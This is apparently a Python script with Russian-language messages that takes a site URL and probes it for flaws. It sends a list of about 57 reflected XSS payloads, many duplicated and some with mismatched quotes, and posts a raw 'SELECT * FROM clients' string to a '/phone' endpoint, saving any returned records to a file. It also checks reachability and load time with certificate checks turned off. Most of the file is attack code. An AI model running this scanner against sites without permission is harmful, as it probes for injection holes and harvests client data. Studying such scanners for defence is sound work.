import time
import requests, ssl, warnings, urllib3

ssl_context = ssl._create_unverified_context()
warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def measure_page_load_time(site_url):
    try:
        response = requests.get(site_url, verify=False)
        load_time = response.elapsed.total_seconds()
        print(f"Скорость загрузки сайта: {load_time} с.")
    except requests.exceptions.RequestException as e:print(f"Cайт: {site_url}, не доступен")

def check_site_accessibility(site_url):
    try:
        response = requests.head(site_url, verify=False)
        if response.status_code == 200:print(f"Сайт: {site_url} доступен")
        else:print(f"Сайт недоступен: {response.status_code}")
    except requests.exceptions.RequestException as e:print(f"Ошибка при проверке доступности сайта: {e}")

def test_xss_vulnerability(site_url):
    xss_list = [
    '<script>alert("XSS1")</script>', '<img src="x" onerror="alert(\'XSS2\')">', '"><script>alert("XSS3")</script>',
    '<svg onload=alert("XSS4")>', '"><img src=x onerror=alert(\'XSS5\')>', '<body onload=alert("XSS6")>',
    '<iframe src="javascript:alert(\'XSS7\')"></iframe>', '<a href="javascript:alert(\'XSS8\')">Click me</a>',
    '<img src="javascript:alert(\'XSS9\')">', '<input type="text" value="<script>alert(\'XSS10\')</script>">',
    '<svg><script>confirm("XSS11")</script></svg>', '<img src="x" onerror="confirm(\'XSS12\')">',
    '<svg onload=confirm("XSS13")>', '"><img src=x onerror=confirm(\'XSS14\')>', '<body onload=confirm("XSS15")>',
    '<iframe src="javascript:confirm(\'XSS16\')"></iframe>', '<a href="javascript:confirm(\'XSS17\')">Click me</a>',
    '<img src="javascript:confirm(\'XSS18\')">', '<input type="text" value="<script>confirm(\'XSS19\')</script>">',
    '<script>alert("XSS20")</script>', '<img src="x" onerror="alert(\'XSS21\')">', '"><script>alert("XSS22")</script>',
    '<svg onload=alert("XSS23")>', '"><img src=x onerror=alert(\'XSS24\')>', '<body onload=alert("XSS25")>',
    '<iframe src="javascript:alert(\'XSS26\')"></iframe>', '<a href="javascript:alert(\'XSS27\')">Click me</a>',
    '<img src="javascript:alert(\'XSS28\')">', '<input type="text" value="<script>alert(\'XSS29\')</script>">',
    '<svg><script>confirm("XSS30")</script></svg>', '<img src="x" onerror="confirm(\'XSS31\')">',
    '<svg onload=confirm("XSS32")>', '"><img src=x onerror=confirm(\'XSS33\')>', '<body onload=confirm("XSS34")>',
    '<iframe src="javascript:confirm(\'XSS35\')"></iframe>', '<a href="javascript:confirm(\'XSS36\')">Click me</a>',
    '<img src="javascript:confirm(\'XSS37\')">', '<input type="text" value="<script>confirm(\'XSS38\')</script>">',
    '<script>alert("XSS39")</script>', '<img src="x" onerror="alert(\'XSS40\')">', '"><script>alert("XSS41\')</script>',
    '<svg onload=alert("XSS42")>', '"><img src=x onerror=alert(\'XSS43\')>', '<body onload=alert("XSS44\')>',
    '<iframe src="javascript:alert(\'XSS45\')"></iframe>', '<a href="javascript:alert(\'XSS46\')">Click me</a>',
    '<img src="javascript:alert(\'XSS47\')">', '<input type="text" value="<script>alert(\'XSS48\')</script>">',
    '<svg><script>confirm("XSS49")</script></svg>', '<img src="x" onerror="confirm(\'XSS50\')">',
    '<svg onload=confirm("XSS51")>', '"><img src=x onerror=confirm(\'XSS52\')>', '<body onload=confirm("XSS53\')>',
    '<iframe src="javascript:confirm(\'XSS54\')"></iframe>', '<a href="javascript:confirm(\'XSS55\')">Click me</a>',
    '<img src="javascript:confirm(\'XSS56\')">', '<input type="text" value="<script>confirm(\'XSS57\')</script>">'
    ]
    print("XSS уязвимости в URL:")

    for payload in xss_list:
        try:
            response = requests.get(site_url, params={'q': payload}, verify=False)
            if payload in response.text:print(f"Есть XSS уязвимость: {payload}")
            else:print(f"XSS_ATTACK_DATA [Атака не выполнена] : {payload}")
        
        except requests.exceptions.RequestException as e:print(f"Ошибка при проверки XSS-Уязвимости: {e}")

def test_sql_injection(site_url):
    try:
        result = requests.post(site_url + "/phone", json={"phone": "SELECT * FROM clients"}, verify=False).json()
        with open("sql-injection.txt", "a") as file:
            for i in result["message"]:
                print("SQL_INJECION_DATA : ", str(i))
                time.sleep(0.005)
                file.write(F"SQL_INJECION_DATA : {str(i)}\n")
                              
        print(f"Угроза SQL-Инъекция: УГРОЗА, результаты тестов в файлe sql-injection.txt\n")
        time.sleep(2)
    
    except requests.exceptions.RequestException as e:print(f"Ошибка при проверки SQL-Инъекции: {e}")

url = input("Укажите URL сайта: ")
test_xss_vulnerability(url), test_sql_injection(url)
check_site_accessibility(url), measure_page_load_time(url)
